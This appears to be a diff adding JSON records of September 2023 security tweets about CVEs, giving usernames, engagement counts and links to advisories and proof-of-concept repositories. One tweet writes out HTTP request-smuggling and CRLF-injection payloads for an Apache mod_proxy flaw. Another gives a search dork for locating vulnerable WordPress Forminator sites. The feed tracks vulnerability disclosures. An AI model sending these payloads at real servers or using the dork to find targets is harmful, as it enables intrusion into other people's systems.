+    "tweeturl": "https://twitter.com/chybeta/status/1703685169637704121",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://exploits.forsale/themebleed/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 18,
+    "tweettext": "CVE-2023-38146: Arbitrary Code Execution via Windows Themes. A series of issues exist on Windows 11 which can lead to arbitrary code being executed when a user loads a .theme file.\n\nPoC\nhttps://t.co/8TEHPZjO0w https://t.co/SbZz9R9gJH",
+    "tweettime": "2023-09-14, 09:04:17",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1702246880439099715",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html"
+    ],
+    "tweetfavorites": 120,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 51,
+    "tweettext": "New Chrome 0day \nCVE-2023-4863\nI saw the person who submitted the vulnerability and wondered if it was related to Pegasus.\nhttps://t.co/fIcSSRholN https://t.co/HpRyizECyF",
+    "tweettime": "2023-09-13, 02:31:35",
+    "tweeturl": "https://twitter.com/blackorbird/status/1701785666005430395",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-x7ch-h5rf-w2mf"
+    ],
+    "tweetfavorites": 696,
+    "tweetquotes": 10,
+    "tweetreplies": 12,
+    "tweetretweets": 176,
+    "tweettext": "Time for an Arm-twist! CVE-2023-4039\n\nTom Hebb (Meta red team) and I discovered an 0day in GCC (for AArch64 targets) during my Arm exploitation training. \n\nIt renders stack canaries against overflows of dynamically-sized variables useless. \n\nhttps://t.co/q0vX86e9gK https://t.co/0NDB39Xg8f",
+    "tweettime": "2023-09-12, 15:52:12",
+    "tweeturl": "https://twitter.com/Fox0x01/status/1701624762059895228",
+    "username": "Fox0x01"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 98,
+    "tweettext": "RT @0xor0ne: CVE-2022-34718: Patch analysis, bug identification and exploit development (Windows TCP/IP Remote Code Execution Vulnerability…",
+    "tweettime": "2023-09-12, 07:50:40",
+    "tweeturl": "https://twitter.com/_odisseus/status/1701503581906497645",
+    "username": "_odisseus"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/09/google-rushes-to-patch-critical-chrome.html"
+    ],
+    "tweetfavorites": 475,
+    "tweetquotes": 14,
+    "tweetreplies": 10,
+    "tweetretweets": 299,
+    "tweettext": "Urgent: Google releases patch for a new Chrome zero-day #vulnerability (CVE-2023-4863) that's being exploited in the wild.\n\nRead: https://t.co/41SANY0lKi\n\nDon't wait—update your browser now to protect against potential cyber threats.\n\n#cybersecurity #informationsecurity",
+    "tweettime": "2023-09-12, 05:17:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1701465123095785662",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://chromium.googlesource.com/webm/libwebp.git/+/2af26267cdfcb63a88e5c74a85927a12d6ca1d76"
+    ],
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 26,
+    "tweettext": "The new In-The-Wild Google Chrome Heap buffer overflow in WebP (CVE-2023-4863) is due to an out-of-bounds write vulnerability within the \"BuildHuffmanTable\" function:\nhttps://t.co/74LEkbLeCO",
+    "tweettime": "2023-09-11, 21:48:02",
+    "tweeturl": "https://twitter.com/hosselot/status/1701351922953748881",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
+    ],
+    "tweetfavorites": 276,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 98,
+    "tweettext": "CVE-2022-34718: Patch analysis, bug identification and exploit development (Windows TCP/IP Remote Code Execution Vulnerability)\nExcellent blog post by @chompie1337 \n\nhttps://t.co/ZDEOVqM765 \n\n#cybersecurity #cve #exploit https://t.co/7WfuQUqbeG",
+    "tweettime": "2023-09-11, 16:30:13",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1701271939149389927",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/chromium/issues/detail?id=1450481"
+    ],
+    "tweetfavorites": 58,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 13,
+    "tweettext": "The Chromium bug entry is now open with a PoC (CVE-2023-3079):\nhttps://t.co/FlqP95rvWN",
+    "tweettime": "2023-09-08, 19:23:38",
+    "tweeturl": "https://twitter.com/hosselot/status/1700228420620190042",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://github.com/bjrjk/CVE-2022-4262/blob/main/CVE-2022-4262.md"
+    ],
+    "tweetfavorites": 124,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 33,
+    "tweettext": "More good stuff on Chrome RCE vuln research: @bjrjk wrote a super deep dive analysis of CVE-2022-4262, a non-trivial type confusion in v8 JavaScript engine which I reverse-engineered from patch early this year and briefly covered in my PHDays talk in May:  https://t.co/lhWuQPXngG…",
+    "tweettime": "2023-09-07, 08:33:17",
+    "tweeturl": "https://twitter.com/alisaesage/status/1699702365337870413",
+    "username": "alisaesage"
+}
+{
+    "expanded_url": [
+        "https://github.com/dhmosfunk/CVE-2023-25690-POC"
+    ],
+    "tweetfavorites": 323,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 121,
+    "tweettext": "[PoC] [CVE-2023-25690] Apache HTTP Server mod_proxy vul\n\nCLRF Injection\nGET /categories/1%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1\nHost: \n\nHeader Injection\nGET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1\nHost: 1.1.1.1\n\nhttps://t.co/st5iVALH8V",
+    "tweettime": "2023-09-06, 01:27:31",
+    "tweeturl": "https://twitter.com/wugeej/status/1699232831883628673",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 1,
+    "tweettext": "The past week I completely failed to port a Chrome sandbox escape exploit for CVE-2021-30633 to Chrome 90. And by completely, I mean _completely_. This is not something I've attempted before, and I have learned so much in the process.... but man, do I feel like a failure 😆",
+    "tweettime": "2023-09-04, 13:19:24",
+    "tweeturl": "https://twitter.com/ajxchapman/status/1698687203419828522",
+    "username": "ajxchapman"
+}
+{
+    "tweetfavorites": 133,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2023-4596: RCE in Forminator plugin for WordPress, 9.8 rating 🔥\n\nThe Forminator plugin in WP is vulnerable to arbitrary file upload for unauthenticated users, which may make RCE possible. PoC is available❗️\n\n👉🏻 Dork: http.body:\"/wp-content/plugins/forminator\"\n\nPoC is here:… https://t.co/ET2b36wngI",
+    "tweettime": "2023-09-04, 11:34:53",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1698660901845700942",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://blog.coffinsec.com/0day/2023/05/31/minidlna-heap-overflow-rca.html",
+        "https://blog.coffinsec.com/0day/2023/06/19/minidlna-cve-2023-33476-exploits.html"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 20,
+    "tweettext": "minidlna 1.3.2 cve-2023-33476 root cause analysis and exploitation \n\nPart1:\nhttp chunk parsing heap overflow (cve-2023-33476) root cause analysis\nhttps://t.co/4hhlWUd7ou\n\nPart2:\nexploiting cve-2023-33476 for remote code execution\nhttps://t.co/1F4HpkgWYW",
+    "tweettime": "2023-09-03, 07:45:25",
+    "tweeturl": "https://twitter.com/kmkz_security/status/1698240766168973659",
+    "username": "kmkz_security"
+}
+{
+    "expanded_url": [
+        "https://github.com/sinsinology/CVE-2023-34039"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 26,
+    "tweettext": "POC for CVE-2023-34039 VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE\nhttps://t.co/rEymx6tdxy",
+    "tweettime": "2023-09-03, 03:07:10",
+    "tweeturl": "https://twitter.com/momika233/status/1698170745644630308",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://cert.gov.ua/article/5661411"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 89,
+    "tweettext": "RT @blackorbird: #GhostWriter Used CVE-2023-38831 to construct malware.\nhttps://t.co/oolDetFliU https://t.co/tVIgCENaV3",
+    "tweettime": "2023-09-02, 15:03:28",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1697988619347063272",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/sinsinology/CVE-2023-34039"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "CVE-2023-34039\n\nPOC for CVE-2023-34039 VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE\n\nhttps://t.co/ZIBwnUGnFy\n\n#cve #cybersecurity #infosec #pentesting #redteam https://t.co/sG6l7gYHsX",
+    "tweettime": "2023-09-02, 11:50:51",
+    "tweeturl": "https://twitter.com/hack_git/status/1697940146253902274",
+    "username": "hack_git"
+}
